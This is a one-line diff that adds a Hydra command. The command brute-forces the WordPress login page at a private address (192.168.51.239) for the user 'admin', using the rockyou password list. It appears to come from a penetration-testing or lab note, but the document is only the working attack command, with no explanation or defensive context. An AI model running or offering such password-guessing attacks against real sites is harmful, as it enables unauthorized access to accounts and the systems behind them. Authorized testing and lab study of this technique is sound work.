@@ -1,0 +1,2 @@
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.51.239 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=Error" -H "Cookie: wordpress_test_cookie=WP+Cookie+check"
